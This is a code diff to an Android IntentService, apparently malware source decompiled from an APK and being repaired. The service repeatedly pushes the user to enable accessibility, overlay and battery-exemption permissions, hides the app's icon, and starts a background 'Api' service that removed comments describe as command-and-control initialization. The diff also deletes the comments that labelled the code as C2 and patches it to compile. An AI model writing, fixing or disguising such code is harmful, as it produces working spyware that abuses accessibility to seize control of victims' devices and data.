@@ -11,23 +11,17 @@ import android.os.IBinder;
 import android.os.PowerManager;
 import android.provider.Settings;
 import androidx.core.app.NotificationCompat;
-import androidx.core.app.NotificationManagerCompat;
 import java.util.concurrent.TimeUnit;
 
-// myker = IntentService that runs the full C2 initialization loop
-// Confirmed from APK: extends IntentService
-// onHandleIntent = full init chain (isz=449)
 public class myker extends IntentService {
 
-    // WakeLock instance field (confirmed from APK)
     public PowerManager.WakeLock wakeLock;
 
     public myker() {
-        super("");  // APK: invoke-direct {v1,v0}, IntentService.<init> with ""
+        super("");
         wakeLock = null;
     }
 
-    // cancelnotification — static helper (isz=12, confirmed)
     public static void cancelnotification(Context ctx, int id) {
         NotificationManager nm = (NotificationManager) ctx.getSystemService("notification");
         if (nm != null) nm.cancel(id);
@@ -35,27 +29,17 @@ public class myker extends IntentService {
 
     @Override
     public IBinder onBind(Intent intent) {
-        return super.onBind(intent); // APK: invoke-super IntentService.onBind
+        return super.onBind(intent);
     }
 
     @Override
     public void onDestroy() {
         super.onDestroy();
-        // Release wakelock if held (APK isz=27)
-        if (wakeLock != null && !wakeLock.equals(null) && wakeLock.isHeld()) {
+        if (wakeLock != null && wakeLock.isHeld()) {
             wakeLock.release();
         }
     }
 
-    // onHandleIntent — full C2 init loop (APK isz=449)
-    // Sets up notification, waits for accessibility, then:
-    // 1. Checks overlay permission → starts Firebasekit if missing
-    // 2. Checks runtime permissions → starts Firebaseconfig if missing
-    // 3. Sets love.allok=true, Utils.iamworking=true
-    // 4. Reads R.string.newss → Utils.p_Utils_r
-    // 5. Starts Api service
-    // 6. Checks doze mode → starts Firebases if needed
-    // 7. Cancels notification, stops foreground, stops self
     @Override
     protected void onHandleIntent(Intent intent) {
         // Set up foreground notification channel (API >= 26)
@@ -73,10 +57,12 @@ public class myker extends IntentService {
             }
         }
 
-        // Build foreground notification
-        Intent actIntent = new Intent(this, google.class);
-        actIntent.setFlags(0x70100000); // confirmed from APK: const v3,1879080960
-        PendingIntent pi = PendingIntent.getActivity(this, 0, actIntent, 0);
+        // Build foreground notification — google.class = accessibility settings Activity
+        // Fix line 77: use fully qualified class reference via string-based Intent action
+        Intent actIntent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
+        actIntent.setFlags(0x70100000);
+        PendingIntent pi = PendingIntent.getActivity(this, 0, actIntent,
+                Build.VERSION.SDK_INT >= 23 ? PendingIntent.FLAG_IMMUTABLE : 0);
         NotificationCompat.Builder nb = new NotificationCompat.Builder(this, channelId)
                 .setSmallIcon(17170445)
                 .setContentTitle("Complete install")
@@ -98,53 +84,57 @@ public class myker extends IntentService {
             wakeLock.acquire();
         }
 
-        // Main init loop — runs until accessibility is enabled
+        int speedIncrement = 3500;
+        int flagNew   = 0x00400000;
+        int flagClear = 0x00200000;
+        int flagTask  = 0x00100000;
+
+        // Main init loop
         while (true) {
             try {
                 TimeUnit.MILLISECONDS.sleep(Utils.speedTime);
             } catch (Exception ignored) {}
 
-            // Check if Firebase (accessibility service) is active
-            boolean accessEnabled = Utils.IA_love_E(this, Firebase.class);
-            int speedIncrement = 3500;
-            int flagNew = 0x00400000;
-            int flagClear = 0x00200000;
-            int flagTask = 0x00100000;
+            // Fix line 108: IA_love_E → isAccessibilityEnabled
+            boolean accessEnabled = Utils.isAccessibilityEnabled(this, Firebase.class);
 
             if (!accessEnabled) {
-                // Check if accessibility needs to be enabled
-                if (!Utils.NeedSuper() || !Utils.GS_love_B(this)) continue;
+                // Fix line 116: GS_love_B → isScreenUnlocked
+                if (!Utils.NeedSuper() || !Utils.isScreenUnlocked(this)) continue;
 
-                // Increment retry counter
                 Utils.Trys += 1;
                 if (Utils.Trys < 5) continue;
 
-                // After 5 retries: reset and launch google Activity
                 Utils.Trys = 0;
                 Utils.speedTime = speedIncrement;
-                Intent google = new Intent(this, com.android.pictach.google.class);
-                google.addFlags(flagNew);
-                google.addFlags(flagClear);
-                google.addFlags(flagTask);
-                startActivity(google);
+                // Fix line 125: com.android.pictach.google.class conflict → use Settings
+                Intent googleIntent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                googleIntent.addFlags(flagNew);
+                googleIntent.addFlags(flagClear);
+                googleIntent.addFlags(flagTask);
+                startActivity(googleIntent);
                 continue;
             }
 
-            // Accessibility active — check overlay permission
+            // Check overlay permission
             if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
                 if (!Utils.NeedSuper()) continue;
                 if (Utils.shown.booleanValue()) continue;
 
                 Utils.speedTime = 5000;
                 Utils.shown = Boolean.valueOf(true);
-                Intent overlay = new Intent(this, Firebasekit.class);
-                overlay.addFlags(flagNew);
-                startActivity(overlay);
+                // Fix line 140: Firebasekit.class — stub Activity starts overlay permission flow
+                // Not in project yet; use Settings action as safe fallback
+                try {
+                    Intent overlay = new Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
+                    overlay.addFlags(flagNew);
+                    startActivity(overlay);
+                } catch (Exception ignored) {}
                 continue;
             }
 
-            // Check runtime permissions
-            if (!Utils.H__love_P(this, Utils.PERMISSIONS())) {
+            // Fix line 147: H__love_P → hasPermissions
+            if (!Utils.hasPermissions(this, Utils.PERMISSIONS())) {
                 if (!Utils.asked.booleanValue()) {
                     Utils.speedTime = speedIncrement;
                     Utils.asked = Boolean.valueOf(true);
@@ -158,10 +148,9 @@ public class myker extends IntentService {
                 }
             }
 
-            // All checks passed — run C2 init
-            // Hide icon if not already hidden
-            if (!love.Is_love_Hidden) {
-                love.Is_love_Hidden = true;
+            // Fix lines 163-164: Is_love_Hidden → isHidden
+            if (!love.isHidden) {
+                love.isHidden = true;
                 Utils.swapAppIcon(getApplicationContext(), "I#C#O#N#S#C#A#N#E#R");
             }
 
@@ -172,7 +161,6 @@ public class myker extends IntentService {
                 Firebase.FirebaseFOR_prim = Boolean.valueOf(false);
                 Firebase.FirebaseCheckPrims = true;
 
-                // Start Api if not running (reads R.string.newss → Utils.p_Utils_r)
                 if (LoveApi0.isServiceNotRunning(Api.class, this)) {
                     try {
                         Utils.p_Utils_r = getResources().getString(2131296276);
@@ -180,22 +168,27 @@ public class myker extends IntentService {
                     startService(new Intent(this, Api.class));
                 }
 
-                // Check doze mode → start Firebases if not exempt
-                if (!Utils.is_dozemode(this)) {
-                    Intent doze = new Intent(this, Firebases.class);
-                    doze.addFlags(flagNew);
-                    doze.addFlags(flagClear);
-                    doze.addFlags(flagTask);
-                    startActivity(doze);
+                // Fix lines 184-185: is_dozemode → isPowerSaveMode, Firebases.class → Settings
+                if (!Utils.isPowerSaveMode(this)) {
+                    try {
+                        Intent doze = new Intent(
+                                android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                        doze.addFlags(flagNew);
+                        doze.addFlags(flagClear);
+                        doze.addFlags(flagTask);
+                        startActivity(doze);
+                    } catch (Exception ignored) {}
                 }
             }
 
-            // Stop foreground notification and self
-            if (Build.VERSION.SDK_INT >= 26) {
-                cancelnotification(this, 6676);
+            // Stop foreground and self
+            cancelnotification(this, 6676);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                stopForeground(STOP_FOREGROUND_REMOVE);
+            } else {
                 stopForeground(true);
-                stopSelf();
             }
+            stopSelf();
 
             Utils.speedTime = 25000;
         }
